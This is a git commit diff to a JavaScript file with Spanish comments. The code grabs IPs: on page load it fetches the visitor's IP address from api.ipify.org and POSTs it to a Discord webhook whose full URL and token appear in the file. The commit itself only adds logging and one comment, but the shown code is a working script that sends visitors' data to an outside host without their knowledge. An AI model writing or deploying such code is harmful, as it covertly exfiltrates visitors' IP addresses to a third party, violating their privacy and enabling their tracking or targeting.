e0120f5d8659cadf5dc93ddc9a2e87777f4c13ec
pepegod432 <elcanaldeyehsl@gmail.com>
2024-06-01 01:51:49 -0300

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,13 @@
+// URL del webhook al que quieres enviar la IP
 const webhookUrl = 'https://discord.com/api/webhooks/1238925995046604810/7mt5Uak7gJwgqd0w4nmmBMXY6Id6XAi_Ka_41LWtAV8dNV8JGG4PuG2eb3FaLWFw9zc-';
 
 // Función para obtener la IP del usuario
 async function getUserIP() {
     try {
-        // Utilizamos un servicio de terceros para obtener la IP
+        console.log('Obteniendo IP del usuario...');
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
+        console.log('IP obtenida:', data.ip);
         return data.ip;
     } catch (error) {
         console.error('Error al obtener la IP:', error);
@@ -21,6 +23,7 @@ async function sendIPToWebhook(ip) {
     }
 
     try {
+        console.log('Enviando IP al webhook...');
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -41,6 +44,8 @@ async function sendIPToWebhook(ip) {
 
 // Obtener y enviar la IP al cargar la página
 document.addEventListener('DOMContentLoaded', async () => {
+    console.log('Documento cargado. Obteniendo IP...');
     const userIP = await getUserIP();
+    console.log('IP obtenida:', userIP);
     await sendIPToWebhook(userIP);
 });
